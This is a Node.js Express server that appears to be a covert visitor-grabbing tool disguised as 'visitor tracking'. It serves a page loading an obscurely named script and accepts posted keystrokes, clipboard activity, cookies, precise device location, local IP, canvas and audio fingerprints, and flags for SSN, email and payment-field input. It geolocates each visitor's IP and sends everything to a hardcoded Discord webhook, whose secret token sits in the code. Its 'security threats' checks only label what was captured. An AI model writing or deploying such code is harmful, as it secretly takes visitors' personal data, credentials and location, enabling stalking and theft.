const express = require('express');
const cors = require('cors');
const useragent = require('useragent');
const rateLimit = require('express-rate-limit');
const { v4: uuidv4 } = require('uuid');
const winston = require('winston');
const csrf = require('csurf');
const cookieParser = require('cookie-parser');
const fs = require('fs').promises;
const path = require('path');

const app = express();

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    new winston.transports.File({ filename: 'visitor.log' }),
    new winston.transports.Console()
  ]
});

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  standardHeaders: true,
  legacyHeaders: false
});

app.use(cors({
  origin: (origin, callback) => {
    const allowedOrigins = [
      'http://localhost:3000',
      'https://random-nfpf.onrender.com',
      'https://vanprojects.netlify.app',
      'https://artifacts.grokusercontent.com'
    ];
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, origin || '*');
    } else {
      logger.warn('CORS Misconfiguration Attempt', { origin });
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true
}));
app.use(cookieParser());
app.use(express.json());
app.use(express.static('public'));
app.use(limiter);

const csrfProtection = csrf({
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: process.env.NODE_ENV === 'production' ? 'None' : 'Lax'
  }
});
app.use(csrfProtection);

app.use((req, res, next) => {
  req.sessionId = req.headers['x-session-id'] || uuidv4();
  res.setHeader('X-Session-ID', req.sessionId);
  res.setHeader('X-CSRF-Token', req.csrfToken());
  logger.info('Generated CSRF token', { sessionId: req.sessionId, csrfToken: req.csrfToken() });
  next();
});

app.get('/csrf-token', csrfProtection, (req, res) => {
  const token = req.csrfToken();
  logger.info('Served CSRF token', { token, sessionId: req.sessionId });
  res.json({ csrfToken: token });
});

app.get('/index.html', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <meta name="csrf-token" content="${req.csrfToken()}">
      <title>Visitor Tracking</title>
    </head>
    <body>
      <h1>Welcome</h1>
      <script src="/_z113.js"></script>
    </body>
    </html>
  `);
});

app.get('/', (req, res) => {
  res.send('Tf you doing here.');
});

function getClientIP(req) {
  const allIPs = new Set();

  const ipHeaders = [
    'x-forwarded-for',
    'cf-connecting-ip',
    'true-client-ip',
    'x-real-ip',
    'x-client-ip',
    'forwarded',
    'x-cluster-client-ip',
    'fastly-client-ip',
    'x-original-forwarded-for'
  ];

  for (const header of ipHeaders) {
    const value = req.headers[header];
    if (value) {
      let ips = [];
      if (header === 'forwarded') {
        const forwards = value.split(',').map(part => part.match(/for=([^;,\s]+)/i)?.[1]?.replace(/[\[\]"]/g, '').trim());
        ips = forwards.filter(ip => ip && isValidIP(ip));
      } else {
        ips = value.split(',').map(ip => ip.trim()).filter(ip => isValidIP(ip));
      }
      ips.forEach(ip => allIPs.add(ip));
    }
  }

  const socketIP = req.socket.remoteAddress?.replace(/^::ffff:/, '');
  if (isValidIP(socketIP)) {
    allIPs.add(socketIP);
  }

  const allIPsArray = Array.from(allIPs);
  const primary = allIPsArray[0] || '127.0.0.1';

  logger.info('Detected IPs', { primary, all: allIPsArray });

  return { primary, all: allIPsArray };
}

function isValidIP(ip) {
  if (!ip) return false;

  const ipv4Regex = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
  if (ipv4Regex.test(ip)) return true;

  const ipv6Regex = /^([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)$/;
  return ipv6Regex.test(ip);
}

function processReferrer(req) {
  const clientReferrer = req.body.part1?.referrer || 'Direct';
  const serverReferrer = req.headers['referer'] || 'Direct';
  const platforms = [
    { domain: 'facebook.com', name: 'Facebook' },
    { domain: 'discord.com', name: 'Discord' },
    { domain: 'youtube.com', name: 'YouTube' },
    { domain: 't.co', name: 'Twitter' },
    { domain: 'reddit.com', name: 'Reddit' },
    { domain: 'tiktok.com', name: 'TikTok' },
    { domain: 'instagram.com', name: 'Instagram' }
  ];
  if (clientReferrer !== 'Direct' && clientReferrer !== 'Unknown (Invalid Referrer)') {
    return clientReferrer;
  }
  if (serverReferrer !== 'Direct') {
    try {
      const url = new URL(serverReferrer);
      const hostname = url.hostname.toLowerCase();
      for (const platform of platforms) {
        if (hostname.includes(platform.domain)) {
          return platform.name;
        }
      }
      return serverReferrer;
    } catch (e) {
      return 'Unknown (Invalid Server Referrer)';
    }
  }
  return 'Direct';
}

function detectSecurityThreats(req, visitorInfo) {
  const threats = [];

  if (req.body.part4?.inlineScripts?.length || req.body.part4?.cookieAccess) {
    threats.push({
      type: 'XSS',
      details: `Detected ${req.body.part4?.inlineScripts?.length || 0} inline scripts and cookie access: ${req.body.part4?.cookieAccess}`
    });
  }

  if ((req.headers['referer'] || req.body.part1?.referrer)?.includes('token=') || (req.headers['referer'] || req.body.part1?.referrer)?.includes('auth=')) {
    threats.push({
      type: 'Referrer Leakage',
      details: `Sensitive data in referrer: ${req.headers['referer'] || req.body.part1?.referrer}`
    });
  }

  if (!req.body.part1?.referrer && !req.headers['referer']) {
    threats.push({
      type: 'Missing Referrer',
      details: 'No referrer provided by client or server'
    });
  }

  if ((req.body.part1?.referrer === 'Unknown (Invalid Referrer)' || req.headers['referer'] === 'Unknown (Invalid Server Referrer)') && req.body.part1?.referrer !== 'Direct') {
    threats.push({
      type: 'Invalid Referrer',
      details: 'Malformed or unparsable referrer detected'
    });
  }

  if (req.body.part4?.thirdPartyRequests?.length) {
    threats.push({
      type: 'Cookie Syncing',
      details: `Third-party requests to: ${req.body.part4?.thirdPartyRequests.join(', ')}`
    });
  }

  if (req.cookies && Object.values(req.cookies).some(value => value.includes('.'))) {
    threats.push({
      type: 'Subdomain Cookie Scope Abuse',
      details: 'Broad cookie value detected'
    });
  }

  if (req.cookies && Object.keys(req.cookies).length > 0 && Object.values(req.cookies).some(value => value.length > 100 || value.includes('session') || value.includes('token'))) {
    threats.push({
      type: 'Suspicious Cookie Content',
      details: `Potentially sensitive or oversized cookies detected: ${JSON.stringify(Object.keys(req.cookies))}`
    });
  }

  if (!req.secure && process.env.NODE_ENV === 'production') {
    threats.push({
      type: 'MITM Risk',
      details: 'Insecure HTTP connection detected'
    });
  }

  if (req.body.part4?.postMessageCalls?.length) {
    threats.push({
      type: 'PostMessage Misuse',
      details: `Unverified postMessage calls: ${req.body.part4?.postMessageCalls.join(', ')}`
    });
  }

  if (req.body.part3?.keystrokes && req.body.part3.keystrokes.includes('password')) {
    threats.push({
      type: 'Sensitive Keylogging',
      details: 'Potentially sensitive data detected in keystrokes'
    });
  }

  if (req.body.part3?.clipboardAccess !== 'None') {
    threats.push({
      type: 'Clipboard Access',
      details: `Clipboard interaction detected: ${req.body.part3.clipboardAccess}`
    });
  }

  if (req.body.part3?.ssnPatternDetected !== 'None') {
    threats.push({
      type: 'SSN Pattern',
      details: 'SSN-like pattern detected in input'
    });
  }

  if (req.body.part3?.emailPatternDetected !== 'None') {
    threats.push({
      type: 'Email Pattern',
      details: 'Email-like pattern detected in input'
    });
  }

  if (req.body.part3?.paymentFieldInteraction !== 'None') {
    threats.push({
      type: 'Payment Field Interaction',
      details: 'Input detected in payment-related field'
    });
  }

  if (req.body.part3?.utmParameters && JSON.parse(req.body.part3.utmParameters || '{}').utm_source?.includes('token')) {
    threats.push({
      type: 'Suspicious UTM Parameter',
      details: 'Potential sensitive data in UTM parameters'
    });
  }

  if (req.body.part3?.eventLog?.includes('password') || req.body.part3?.eventLog?.includes('card') || req.body.part3?.eventLog?.includes('ssn')) {
    threats.push({
      type: 'Sensitive Event',
      details: 'Potentially sensitive data in event log'
    });
  }

  if (req.body.part4?.clientCookies && (req.body.part4.clientCookies.includes('token') || req.body.part4.clientCookies.includes('session'))) {
    threats.push({
      type: 'Sensitive Client Cookies',
      details: 'Potentially sensitive data in client-sent cookies'
    });
  }

  if (req.body.part4?.localStorageUsage > 0) {
    threats.push({
      type: 'Local Storage Monitoring',
      details: `Local storage usage detected: ${req.body.part4.localStorageUsage} bytes`
    });
  }

  if (req.body.part1?.location !== 'Unknown' && req.body.part1?.location.latitude === 0 && req.body.part1?.location.longitude === 0) {
    threats.push({
      type: 'Suspicious Location',
      details: 'Device location coordinates (0, 0) detected'
    });
  }

  return threats;
}

app.post('/api/visit', csrfProtection, async (req, res) => {
  try {
    logger.info('Received /api/visit request', {
      headers: req.headers,
      cookies: req.cookies,
      body: req.body
    });
    const ipInfo = getClientIP(req);
    const ip = ipInfo.primary;

    const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,as,query,mobile,proxy,hosting`);
    const geoData = await geoResponse.json();

    if (geoData.status === 'fail') {
      logger.error('Geolocation API error', { message: geoData.message, ip });
      return res.status(400).send('Invalid IP address');
    }

    const agent = useragent.parse(req.headers['user-agent']);
    const referer = processReferrer(req);

    const plugins = req.body.part3?.plugins ? Array.isArray(req.body.part3.plugins) ? req.body.part3.plugins : [] : [];
    const mimeTypes = req.body.part3?.mimeTypes ? Array.isArray(req.body.part3.mimeTypes) ? req.body.part3.mimeTypes : [] : [];

    const visitorInfo = {
      sessionId: req.sessionId,
      ip: geoData.query,
      allIPs: ipInfo.all,
      country: geoData.country,
      region: geoData.regionName,
      city: geoData.city,
      zip: geoData.zip,
      latitude: geoData.lat,
      longitude: geoData.lon,
      isp: geoData.isp,
      organization: geoData.org,
      as: geoData.as,
      mobile: geoData.mobile,
      proxy: geoData.proxy,
      hosting: geoData.hosting,
      device: req.body.part1?.device || 'Unknown',
      timestamp: req.body.part1?.timestamp || new Date().toISOString(),
      browser: agent.toAgent(),
      os: agent.os.toString(),
      deviceType: agent.device.toString(),
      referer: referer,
      acceptLanguage: req.headers['accept-language'] || 'Unknown',
      accept: req.headers['accept'] || 'Unknown',
      connection: req.headers['connection'] || 'Unknown',
      requestMethod: req.method,
      requestPath: req.originalUrl,
      userAgentRaw: req.headers['user-agent'],
      screenSize: req.body.part1?.screenSize || 'Unknown',
      colorDepth: req.body.part3?.colorDepth || 'Unknown',
      timezone: req.body.part3?.timezone || 'Unknown',
      language: req.body.part3?.language || 'Unknown',
      hardwareConcurrency: req.body.part3?.hardwareConcurrency || 'Unknown',
      deviceMemory: req.body.part3?.deviceMemory || 'Unknown',
      doNotTrack: req.body.part3?.doNotTrack || 'Unknown',
      plugins: plugins,
      mimeTypes: mimeTypes,
      inlineScripts: req.body.part4?.inlineScripts || [],
      cookieAccess: req.body.part4?.cookieAccess || false,
      thirdPartyRequests: req.body.part4?.thirdPartyRequests || [],
      postMessageCalls: req.body.part4?.postMessageCalls || [],
      touchSupport: req.body.part3?.touchSupport || 'Unknown',
      batteryStatus: req.body.part3?.batteryStatus || 'Unknown',
      currentUrl: req.body.part1?.currentUrl || 'Unknown',
      scrollPosition: req.body.part3?.scrollPosition || 'Unknown',
      cookies: JSON.stringify(req.cookies) || '{}',
      location: req.body.part1?.location || 'Unknown',
      part3: {
        keystrokes: req.body.part3?.keystrokes || 'None',
        mouseMovementFrequency: req.body.part3?.mouseMovementFrequency || 'Unknown',
        webglSupport: req.body.part3?.webglSupport || 'Unknown',
        connectionType: req.body.part3?.connectionType || 'Unknown',
        clipboardAccess: req.body.part3?.clipboardAccess || 'None',
        deviceOrientationSupport: req.body.part3?.deviceOrientationSupport || 'Unknown',
        sessionStorageUsage: req.body.part3?.sessionStorageUsage || 'Unknown',
        browserFeatures: req.body.part3?.browserFeatures || 'None',
        pageLoadTime: req.body.part3?.pageLoadTime || 'Unknown',
        userInteractionCount: req.body.part3?.userInteractionCount || 0,
        ssnPatternDetected: req.body.part3?.ssnPatternDetected || 'None',
        emailPatternDetected: req.body.part3?.emailPatternDetected || 'None',
        paymentFieldInteraction: req.body.part3?.paymentFieldInteraction || 'None',
        utmParameters: req.body.part3?.utmParameters || '{}',
        clickedElements: req.body.part3?.clickedElements || 'None',
        sessionDuration: req.body.part3?.sessionDuration || 'Unknown',
        eventLog: req.body.part3?.eventLog || 'None'
      },
      part4: {
        clientCookies: req.body.part4?.clientCookies || 'None',
        localStorageUsage: req.body.part4?.localStorageUsage || 'Unknown',
        localIP: req.body.part4?.localIP || 'Unknown',
        canvasFingerprint: req.body.part4?.canvasFingerprint || 'None',
        audioFingerprint: req.body.part4?.audioFingerprint || 'None'
      }
    };

    const threats = detectSecurityThreats(req, visitorInfo);
    if (threats.length) {
      logger.warn('Security Threats Detected', { threats, visitorInfo });
    }

    logger.info('Visitor Info', { ...visitorInfo, threats });

    const webhookURL = 'https://ptb.discord.com/api/webhooks/1423009299826868396/7ezGh2CAQRooHIvE5sXCBGW0AAgFE2Ku8aFqUDe2eqC2BG7quehvy6JBgWqSwfhrROAq';

    const fields = [
      { name: 'Session ID', value: visitorInfo.sessionId, inline: true },
      { name: 'IP', value: visitorInfo.ip, inline: true },
      { name: 'All IPs', value: visitorInfo.allIPs.join(', ') || 'N/A', inline: true },
      { name: 'Device', value: visitorInfo.device, inline: true },
      { name: 'Referer', value: visitorInfo.referer, inline: true },
      { name: 'Current URL', value: visitorInfo.currentUrl, inline: true },
      { name: 'Timestamp', value: visitorInfo.timestamp, inline: true },
      { name: 'Country', value: visitorInfo.country, inline: true },
      { name: 'City', value: visitorInfo.city, inline: true },
      { name: 'Coordinates', value: `(${visitorInfo.latitude}, ${visitorInfo.longitude})`, inline: true },
      { name: 'Device Location', value: visitorInfo.location !== 'Unknown' ? `(${visitorInfo.location.latitude}, ${visitorInfo.location.longitude}, Accuracy: ${visitorInfo.location.accuracy}m)` : visitorInfo.location, inline: true },
      { name: 'ISP', value: visitorInfo.isp, inline: true },
      { name: 'Mobile', value: visitorInfo.mobile ? 'Yes' : 'No', inline: true },
      { name: 'Proxy', value: visitorInfo.proxy ? 'Yes' : 'No', inline: true },
      { name: 'Hosting', value: visitorInfo.hosting ? 'Yes' : 'No', inline: true },
      { name: 'Browser', value: visitorInfo.browser, inline: true },
      { name: 'OS', value: visitorInfo.os, inline: true },
      { name: 'Device Type', value: visitorInfo.deviceType, inline: true },
      { name: 'Screen Size', value: visitorInfo.screenSize, inline: true },
      { name: 'Timezone', value: visitorInfo.timezone, inline: true },
      { name: 'Language', value: visitorInfo.language, inline: true },
      { name: 'Accept Language', value: visitorInfo.acceptLanguage, inline: true },
      { name: 'Touch Support', value: visitorInfo.touchSupport, inline: true },
      { name: 'Battery Status', value: visitorInfo.batteryStatus, inline: true },
      { name: 'Color Depth', value: visitorInfo.colorDepth, inline: true },
      { name: 'Hardware Concurrency', value: visitorInfo.hardwareConcurrency, inline: true },
      { name: 'Device Memory', value: visitorInfo.deviceMemory, inline: true },
      { name: 'Do Not Track', value: visitorInfo.doNotTrack, inline: true },
      { name: 'Connection', value: visitorInfo.connection, inline: true },
      { name: 'Scroll Position', value: visitorInfo.scrollPosition, inline: true },
      { name: 'Cookies (Server)', value: visitorInfo.cookies, inline: true },
      { name: 'Keystrokes', value: visitorInfo.part3.keystrokes, inline: true },
      { name: 'Mouse Frequency', value: visitorInfo.part3.mouseMovementFrequency, inline: true },
      { name: 'WebGL Support', value: visitorInfo.part3.webglSupport, inline: true },
      { name: 'Connection Type', value: visitorInfo.part3.connectionType, inline: true },
      { name: 'Clipboard Access', value: visitorInfo.part3.clipboardAccess, inline: true },
      { name: 'Device Orientation', value: visitorInfo.part3.deviceOrientationSupport, inline: true },
      { name: 'Session Storage', value: visitorInfo.part3.sessionStorageUsage, inline: true },
      { name: 'Browser Features', value: visitorInfo.part3.browserFeatures, inline: true },
      { name: 'Page Load Time', value: visitorInfo.part3.pageLoadTime, inline: true },
      { name: 'Interaction Count', value: visitorInfo.part3.userInteractionCount.toString(), inline: true },
      { name: 'SSN Pattern', value: visitorInfo.part3.ssnPatternDetected, inline: true },
      { name: 'Email Pattern', value: visitorInfo.part3.emailPatternDetected, inline: true },
      { name: 'Payment Interaction', value: visitorInfo.part3.paymentFieldInteraction, inline: true },
      { name: 'UTM Parameters', value: visitorInfo.part3.utmParameters, inline: true },
      { name: 'Clicked Elements', value: visitorInfo.part3.clickedElements, inline: true },
      { name: 'Session Duration', value: visitorInfo.part3.sessionDuration, inline: true },
      { name: 'Event Log', value: visitorInfo.part3.eventLog, inline: true },
      { name: 'Client Cookies', value: visitorInfo.part4.clientCookies, inline: true },
      { name: 'Local Storage Usage', value: visitorInfo.part4.localStorageUsage, inline: true },
      { name: 'Local IP', value: visitorInfo.part4.localIP, inline: true },
      { name: 'Canvas Fingerprint', value: visitorInfo.part4.canvasFingerprint, inline: true },
      { name: 'Audio Fingerprint', value: visitorInfo.part4.audioFingerprint, inline: true },
      { name: 'Threats', value: threats.length ? threats.map(t => `${t.type}: ${t.details}`).join('\n') : 'None', inline: false }
    ];

    const part1 = fields.slice(0, 15);
    const part2 = fields.slice(15, 30);
    const part3 = fields.slice(30, 45);
    const part4 = fields.slice(45);

    const payload1 = {
      embeds: [{
        title: 'New Visitor Detected! (Part 1 - Critical Info)',
        color: threats.length ? 0xff0000 : 0x00ff00,
        timestamp: visitorInfo.timestamp,
        fields: part1
      }]
    };

    const payload2 = {
      embeds: [{
        title: 'New Visitor Detected! (Part 2 - Device Details)',
        color: threats.length ? 0xff0000 : 0x00ff00,
        timestamp: visitorInfo.timestamp,
        fields: part2
      }]
    };

    const payload3 = {
      embeds: [{
        title: 'New Visitor Detected! (Part 3 - Interactions)',
        color: threats.length ? 0xff0000 : 0x00ff00,
        timestamp: visitorInfo.timestamp,
        fields: part3
      }]
    };

    const payload4 = {
      embeds: [{
        title: 'New Visitor Detected! (Part 4 - Fingerprints & Threats)',
        color: threats.length ? 0xff0000 : 0x00ff00,
        timestamp: visitorInfo.timestamp,
        fields: part4
      }]
    };

    try {
      const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
      const logDir = path.join(__dirname, 'logs');
      await fs.mkdir(logDir, { recursive: true });

      const logFile1 = path.join(logDir, `webhook_payload_1_${timestamp}.txt`);
      await fs.writeFile(logFile1, JSON.stringify(payload1, null, 2));
      logger.info('Saved webhook payload 1 to file', { file: logFile1, payloadSize: JSON.stringify(payload1).length });

      const logFile2 = path.join(logDir, `webhook_payload_2_${timestamp}.txt`);
      await fs.writeFile(logFile2, JSON.stringify(payload2, null, 2));
      logger.info('Saved webhook payload 2 to file', { file: logFile2, payloadSize: JSON.stringify(payload2).length });

      const logFile3 = path.join(logDir, `webhook_payload_3_${timestamp}.txt`);
      await fs.writeFile(logFile3, JSON.stringify(payload3, null, 2));
      logger.info('Saved webhook payload 3 to file', { file: logFile3, payloadSize: JSON.stringify(payload3).length });

      const logFile4 = path.join(logDir, `webhook_payload_4_${timestamp}.txt`);
      await fs.writeFile(logFile4, JSON.stringify(payload4, null, 2));
      logger.info('Saved webhook payload 4 to file', { file: logFile4, payloadSize: JSON.stringify(payload4).length });

      logger.info('Attempting to send to Discord Webhook (Part 1)', { webhookURL, payloadSize: JSON.stringify(payload1).length });
      const webhookResponse1 = await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload1)
      });

      if (!webhookResponse1.ok) {
        const text = await webhookResponse1.text();
        logger.error('Failed to send to Discord Webhook (Part 1)', {
          status: webhookResponse1.status,
          statusText: webhookResponse1.statusText,
          response: text,
          webhookURL
        });
        return res.status(500).send('Failed to send visitor info to Discord (Part 1)');
      }

      logger.info('Successfully sent to Discord Webhook (Part 1)', { status: webhookResponse1.status, webhookURL });

      await new Promise(resolve => setTimeout(resolve, 2000));

      logger.info('Attempting to send to Discord Webhook (Part 2)', { webhookURL, payloadSize: JSON.stringify(payload2).length });
      const webhookResponse2 = await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload2)
      });

      if (!webhookResponse2.ok) {
        const text = await webhookResponse2.text();
        logger.error('Failed to send to Discord Webhook (Part 2)', {
          status: webhookResponse2.status,
          statusText: webhookResponse2.statusText,
          response: text,
          webhookURL
        });
        return res.status(500).send('Failed to send visitor info to Discord (Part 2)');
      }

      logger.info('Successfully sent to Discord Webhook (Part 2)', { status: webhookResponse2.status, webhookURL });

      await new Promise(resolve => setTimeout(resolve, 2000));

      logger.info('Attempting to send to Discord Webhook (Part 3)', { webhookURL, payloadSize: JSON.stringify(payload3).length });
      const webhookResponse3 = await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload3)
      });

      if (!webhookResponse3.ok) {
        const text = await webhookResponse3.text();
        logger.error('Failed to send to Discord Webhook (Part 3)', {
          status: webhookResponse3.status,
          statusText: webhookResponse3.statusText,
          response: text,
          webhookURL
        });
        return res.status(500).send('Failed to send visitor info to Discord (Part 3)');
      }

      logger.info('Successfully sent to Discord Webhook (Part 3)', { status: webhookResponse3.status, webhookURL });

      await new Promise(resolve => setTimeout(resolve, 2000));

      logger.info('Attempting to send to Discord Webhook (Part 4)', { webhookURL, payloadSize: JSON.stringify(payload4).length });
      const webhookResponse4 = await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload4)
      });

      if (!webhookResponse4.ok) {
        const text = await webhookResponse4.text();
        logger.error('Failed to send to Discord Webhook (Part 4)', {
          status: webhookResponse4.status,
          statusText: webhookResponse4.statusText,
          response: text,
          webhookURL
        });
        return res.status(500).send('Failed to send visitor info to Discord (Part 4)');
      }

      logger.info('Successfully sent to Discord Webhook (Part 4)', { status: webhookResponse4.status, webhookURL });

    } catch (error) {
      logger.error('Error sending to Discord Webhook', { error: error.message, stack: error.stack, webhookURL });
      return res.status(500).send('Error sending visitor info to Discord');
    }

    res.status(200).send('Visitor info recorded');
  } catch (error) {
    logger.error('Error in /api/visit', { error: error.message, stack: error.stack, body: req.body });
    res.status(500).send('Server error');
  }
});

app.use((req, res, next) => {
  logger.info('Incoming Request', {
    method: req.method,
    path: req.originalUrl,
    ip: getClientIP(req).primary,
    timestamp: new Date().toISOString()
  });
  next();
});

app.use((err, req, res, next) => {
  logger.error('Unhandled error', { error: err.message, stack: err.stack });
  if (err.code === 'EBADCSRFTOKEN') {
    logger.warn('CSRF Attack Detected', {
      ip: getClientIP(req).primary,
      path: req.originalUrl,
      cookies: req.cookies,
      headers: req.headers
    });
    res.status(403).send('Invalid CSRF token');
  } else {
    res.status(500).send('Something broke!');
  }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => logger.info(`Server running on port ${PORT}`));
